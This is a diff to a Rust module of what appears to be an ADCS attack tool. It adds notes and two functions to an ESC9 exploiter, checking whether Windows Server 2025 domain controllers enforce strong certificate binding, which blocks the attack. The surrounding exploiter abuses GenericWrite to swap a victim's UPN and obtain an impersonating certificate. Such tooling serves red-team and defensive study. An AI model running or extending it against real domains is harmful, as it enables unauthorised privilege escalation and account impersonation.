@@ -27,7 +27,14 @@
 //! always attempt to restore the original UPN even on failure paths.  The caller
 //! should supply working LDAP credentials that have `GenericWrite` on the victim
 //! object.
+//!
+//! # WS2025 Considerations
+//! On **Windows Server 2025 fresh installs** the KDC defaults to
+//! `StrongCertificateBindingEnforcement=2` (Enforced), which **blocks** this attack.
+//! Upgrades from WS2022 preserve `1` (Compatibility).  Always check the enforcement
+//! state before running ESC9 — use `check_enforcement_precondition()`.
 
+use crate::adcs::esc_strong_mapping::{collect_dc_builds, is_ws2025_build, reg_query_command, StrongBindingState};
 use crate::adcs::pfx::create_pfx;
 use crate::adcs::web_enrollment::WebEnrollmentClient;
 use crate::adcs::{IssuedCertificate, create_esc1_csr};
@@ -266,6 +273,52 @@ impl Esc9Exploiter {
         let mut result = cert_result?;
         result.upn_restored = upn_restored;
         Ok(result)
+    }
+
+    /// Determine whether the DC-side `StrongCertificateBindingEnforcement` allows
+    /// weak mapping (ESC9 pre-requisite check).
+    ///
+    /// Returns `Ok(true)` if the attack can proceed, `Ok(false)` if enforcement
+    /// blocks it, or `Err` if the state cannot be determined (caller should warn).
+    ///
+    /// This is a best-effort check using:
+    /// 1. DC build version from LDAP (`operatingSystem` attribute)
+    /// 2. Registry query via SMB is *not* performed here (requires admin rights on DC)
+    pub async fn check_enforcement_precondition(ldap: &mut LdapSession) -> Result<Option<StrongBindingState>> {
+        let dc_info = collect_dc_builds(ldap).await;
+        let ws2025_dc_present = dc_info.iter().any(|os| is_ws2025_build(Some(os), None));
+
+        if ws2025_dc_present {
+            info!(
+                "ESC9: WS2025 DC detected — StrongCertificateBindingEnforcement defaults to 2 (Enforced). \
+                 Use: {}",
+                dc_info.first().map(|d| reg_query_command(d)).unwrap_or_default()
+            );
+            // Return Unknown since we can't determine without registry access
+            Ok(Some(StrongBindingState::Unknown))
+        } else {
+            info!("ESC9: No WS2025 DCs detected — pre-WS2025 defaults apply");
+            Ok(None)
+        }
+    }
+
+    /// Check whether the enforcement state would allow ESC9 and emit
+    /// warnings during the exploit flow.
+    pub fn warn_if_blocked(binding_state: &Option<StrongBindingState>) {
+        match binding_state {
+            Some(StrongBindingState::Enforced) => {
+                warn!("ESC9: BLOCKED — StrongCertificateBindingEnforcement=2 (Enforced) on WS2025 DC");
+            }
+            Some(StrongBindingState::Unknown) => {
+                warn!("ESC9: Cannot verify StrongCertificateBindingEnforcement — confirm with reg query");
+            }
+            Some(StrongBindingState::Disabled | StrongBindingState::Compatibility) => {
+                info!("ESC9: StrongCertificateBindingEnforcement allows weak mapping");
+            }
+            None => {
+                info!("ESC9: No WS2025 DC detected — pre-WS2025 defaults apply");
+            }
+        }
     }
 
     /// Generate LDAP command strings that the operator must execute to temporarily
